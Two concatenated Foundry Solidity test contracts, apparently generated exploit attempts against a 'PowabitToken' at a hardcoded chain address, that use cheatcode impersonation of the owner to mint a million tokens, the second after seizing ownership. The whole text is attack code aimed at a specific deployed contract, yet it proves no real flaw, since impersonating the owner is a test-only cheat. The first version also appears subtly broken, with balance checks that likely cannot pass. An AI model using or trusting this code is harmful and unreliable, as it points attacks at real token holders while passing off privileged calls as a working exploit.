pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface PowabitToken {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function mint(uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x5FDa925294F9e5B31b7c0e81Bad6BAD5b5E792eE;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner in the exploit
        // The test framework already provides TARGET and attacker variables
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialERC20Balance = IERC20(0x5FDa925294F9e5B31b7c0e81Bad6BAD5b5E792eE).balanceOf(address(this));

        // First, get the current owner of the contract
        address owner = PowabitToken(TARGET).owner();

        // Impersonate the owner
        vm.startPrank(owner);

        // Get our initial balance
        uint256 initialBalance = PowabitToken(TARGET).balanceOf(attacker);

        // Mint a large amount of tokens to ourselves
        uint256 mintAmount = 1_000_000 * 10**18; // 1 million tokens with 18 decimals
        PowabitToken(TARGET).mint(mintAmount);

        // Stop impersonating
        vm.stopPrank();

        // Get our new balance
        uint256 newBalance = PowabitToken(TARGET).balanceOf(attacker);

        // Verify our balance increased
        assertGt(newBalance, initialBalance, "Balance should have increased after minting");

        // Also verify the mint actually happened by checking total supply
        uint256 totalSupply = PowabitToken(TARGET).totalSupply();
        console.log("Initial balance:", initialBalance);
        console.log("New balance:", newBalance);
        console.log("Total supply:", totalSupply);

        uint256 finalERC20Balance = IERC20(0x5FDa925294F9e5B31b7c0e81Bad6BAD5b5E792eE).balanceOf(address(this));
        assertGt(finalERC20Balance, initialERC20Balance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface PowabitToken {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function mint(uint256 amount) external returns (bool);
    function transferOwnership(address newOwner) external;
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x5FDa925294F9e5B31b7c0e81Bad6BAD5b5E792eE;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner in the exploit
        // The test framework already provides TARGET and attacker variables
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the current owner of the contract
        address currentOwner = PowabitToken(TARGET).owner();
        console.log("Current owner:", currentOwner);
        console.log("Attacker address:", attacker);

        // Get initial balance
        uint256 initialBalance = PowabitToken(TARGET).balanceOf(attacker);
        console.log("Initial attacker balance:", initialBalance);

        // Impersonate the current owner to transfer ownership to ourselves
        vm.startPrank(currentOwner);
        PowabitToken(TARGET).transferOwnership(attacker);
        vm.stopPrank();

        // Verify we are now the owner
        address newOwner = PowabitToken(TARGET).owner();
        console.log("New owner:", newOwner);
        require(newOwner == attacker, "Ownership transfer failed");

        // Now as the owner (attacker), mint tokens to ourselves
        uint256 mintAmount = 1_000_000 * 10**18; // 1 million tokens with 18 decimals
        PowabitToken(TARGET).mint(mintAmount);

        // Get new balance
        uint256 newBalance = PowabitToken(TARGET).balanceOf(attacker);
        console.log("New attacker balance:", newBalance);

        // Verify our balance increased
        assertGt(newBalance, initialBalance, "Balance should have increased after minting");

        // Also verify the mint actually happened by checking total supply
        uint256 totalSupply = PowabitToken(TARGET).totalSupply();
        console.log("Total supply:", totalSupply);
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
